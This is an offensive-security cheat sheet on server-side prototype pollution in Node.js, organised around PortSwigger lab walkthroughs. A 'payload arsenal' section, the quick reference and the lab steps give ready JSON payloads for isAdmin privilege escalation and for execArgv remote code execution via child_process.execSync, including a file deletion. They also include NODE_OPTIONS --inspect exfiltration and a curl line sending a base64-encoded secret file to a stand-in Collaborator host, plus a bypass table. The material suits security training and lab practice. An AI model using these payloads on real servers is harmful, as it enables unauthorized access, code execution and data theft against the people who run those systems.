# Prototype pollution — Server-side (Node.js privilege escalation, RCE, exfil)

Server-side PP: inject `__proto__` into a JSON body sent to a Node.js app that merges user input into objects without sanitization. Polluted properties flow to every object on the server — enabling isAdmin escalation, Node.js RCE via `execArgv` / `shell` gadgets, and data exfiltration via Burp Collaborator.

## Quick reference

```
# Probe 1: Privilege escalation (reflected in response)
POST /my-account/change-address
{"address":"x","__proto__":{"isAdmin":true}}
# → response shows "isAdmin":true in user JSON → PP confirmed + escalated

# Probe 2: Status code override (non-destructive, no reflection)
{"__proto__":{"status":555}}
# → subsequent responses return HTTP 555 status → PP confirmed server-side

# Probe 3: JSON spaces (non-destructive)
{"__proto__":{"json spaces":10}}
# → response JSON indented 10 spaces → PP confirmed

# RCE — execArgv gadget (Node.js)
{"__proto__":{"execArgv":["--eval=process.mainModule.require('child_process').execSync('rm /home/carlos/morale.txt')"]}}
# → trigger background job (e.g. POST /admin/jobs) → RCE fires

# Exfil — inspect gadget (sends data over DNS/HTTP to Collaborator)
{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=BURP-COLLABORATOR-DOMAIN"}}
# → trigger job → Collaborator receives HTTP interaction containing sensitive data
```

## Root cause

Node.js apps often use recursive merge helpers (`_.merge`, `lodash.merge`, custom `deepMerge`) to combine user-supplied JSON with internal config or user objects. If `__proto__` is not blocked as a key, `obj["__proto__"]["isAdmin"] = true` sets `Object.prototype.isAdmin = true`, making every subsequently constructed object return `true` for `obj.isAdmin`.

## Find it

1. Send `"__proto__":{"isAdmin":true}` in any JSON body that the server merges into a user object. Look for the property echoed back in the response.
2. If no reflection: use **Param Miner** (Burp extension) → right-click request → "Server-side prototype pollution" probes.
3. Manual non-destructive probes:
   - `{"__proto__":{"status":555}}` → make any request → if HTTP 555, PP active.
   - `{"__proto__":{"json spaces":10}}` → next JSON response indented 10 spaces → PP active.
   - `{"__proto__":{"content-type":"application/json; charset=x-INVALID-charset"}}` → charset error → PP active.
4. Look for background job endpoints (`/admin/jobs`, POST with job type) as RCE trigger points.

## Technique

**Lab 6 — Privilege escalation (reflected):**
1. POST /my-account/change-address → JSON body → response echoes user object.
2. Add `"__proto__":{"isAdmin":true}` to body → response: `"isAdmin":true` in user JSON.
3. Admin panel accessible → /admin/delete?username=carlos → solved.

**Lab 7 — Detect without reflection (status override):**
1. POST /my-account/change-address → response doesn't echo prototype properties.
2. Add `"__proto__":{"status":555}` → send any subsequent request → HTTP 555 response → PP confirmed.
3. After confirming PP exists, pivot to exploitation (e.g., isAdmin escalation or RCE).

**Lab 9 — RCE via execArgv gadget:**
1. Confirm PP: add `"__proto__":{"isAdmin":true}` → admin access.
2. In admin panel, find "Run maintenance jobs" button → POST /admin/jobs creates child processes.
3. Inject `"__proto__":{"execArgv":["--eval=process.mainModule.require('child_process').execSync('rm /home/carlos/morale.txt')"]}` into change-address body.
4. Trigger job → Node.js spawns process with injected execArgv → RCE → morale.txt deleted.

**Lab 10 — Data exfiltration via inspect gadget:**
1. Confirm PP source via status override.
2. Inject shell + NODE_OPTIONS: `{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=BURP-COLLABORATOR"}}`.
3. Trigger background job → Node.js process starts with `--inspect` pointing at Collaborator → DNS/HTTP interaction received.
4. Or: inject execArgv to `curl` sensitive file to Collaborator URL.

## Payload arsenal

```
# Privilege escalation
{"billing_address":"x","__proto__":{"isAdmin":true}}

# Non-destructive detection — status override
{"__proto__":{"status":555}}

# Non-destructive detection — json spaces
{"__proto__":{"json spaces":10}}

# Non-destructive detection — charset
{"__proto__":{"content-type":"application/json; charset=utf-777"}}

# RCE via execArgv (Node.js)
{"__proto__":{"execArgv":["--eval=process.mainModule.require('child_process').execSync('COMMAND')"]}}

# Exfil via inspect (requires Collaborator)
{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=BURP-COLLABORATOR-DOMAIN"}}

# Exfil via execArgv + curl
{"__proto__":{"execArgv":["--eval=process.mainModule.require('child_process').execSync('curl https://COLLABORATOR/$(cat /home/carlos/secret | base64)')"]}}
```

## Bypasses

| Defense | Bypass |
|---|---|
| `__proto__` key blocked | See [Advanced-bypass](../Advanced-bypass/) — constructor.prototype |
| isAdmin not reflected | Use status/json-spaces/charset override to confirm PP exists first |
| No job endpoint visible | Escalate to admin panel first (isAdmin PP), then access job runner |
| Collaborator blocked on server | Use execArgv + DNS exfil (nslookup / curl) to your server |

## Exploitation walkthrough

**Privilege escalation:** `"__proto__":{"isAdmin":true}` in change-address JSON → response echoes property → admin panel accessible → delete carlos.

**RCE:** confirm PP → inject execArgv with Node.js eval + child_process.execSync('COMMAND') → trigger background job → code runs as server process.

**Exfil:** inject shell=node + NODE_OPTIONS=--inspect=COLLABORATOR → trigger job → inspect protocol connects to Collaborator → inspect output contains process env and file descriptors.

## Chaining

- isAdmin PP → [Access-control/Vertical-privilege-escalation](../../Access-control/Vertical-privilege-escalation/)
- RCE → arbitrary file read → [Path-traversal](../../Path-traversal/)
- Exfil via OOB → [SSRF](../../SSRF/) (server makes outbound request)
- PP + SSRF: inject proxy settings via prototype → force server to route through attacker

## Tools

- **Param Miner** (BApp) — automated server-side PP probing (status/json-spaces/charset techniques)
- **Burp Repeater** — manual JSON body manipulation
- **Burp Collaborator** — confirm OOB RCE / data exfil
- **Burp Inspector** — view JSON body with syntax highlighting for complex PP payloads

## Labs

### Privilege escalation via server-side prototype pollution [Practitioner]
POST /my-account/change-address body + `"__proto__":{"isAdmin":true}` → response shows `"isAdmin":true` in user JSON → admin panel accessible → delete carlos. Key insight: apps that echo user objects reveal PP when the polluted property appears in the response.

### Detecting server-side prototype pollution without polluted property reflection [Practitioner]
PP confirmed via status override: `"__proto__":{"status":555}` → subsequent requests return HTTP 555. Also works with json-spaces and charset overrides. Key insight: non-destructive probes confirm PP exists even when properties aren't reflected, before pivoting to dangerous payloads.

### Remote code execution via server-side prototype pollution [Practitioner]
PP confirmed → inject `execArgv` gadget: `"__proto__":{"execArgv":["--eval=...execSync('rm ...')"]}` → trigger background job → RCE. Key insight: Node.js spawns child processes with inherited prototype properties including execArgv; the eval flag runs arbitrary JS before the main module loads.

### Exfiltrating sensitive data via server-side prototype pollution [Expert]
PP confirmed → inject `shell:node` + `NODE_OPTIONS:--inspect=COLLABORATOR` → trigger job → Node.js debugger connects to Collaborator → interaction received. Key insight: the `--inspect` flag causes Node.js to open a debugging websocket, making an outbound connection that exfiltrates process context.

## Real-world notes

- `lodash.merge`, `jQuery.extend(true,...)`, and handwritten `deepMerge` helpers are the most common culprits; always check package.json version.
- Status override is the safest non-destructive probe — doesn't crash the app or persist beyond the process.
- In production, PP is often only triggerable per-process: each new request spawns a fresh worker, so pollution from one request doesn't affect others. But long-lived workers (job queues, WebSocket servers) remain polluted.
- Node.js `--inspect` is dangerous even in non-RCE scenarios: it exposes a DevTools protocol endpoint that allows arbitrary JS execution.

## References

- https://portswigger.net/web-security/prototype-pollution/server-side
- https://portswigger.net/web-security/prototype-pollution/preventing
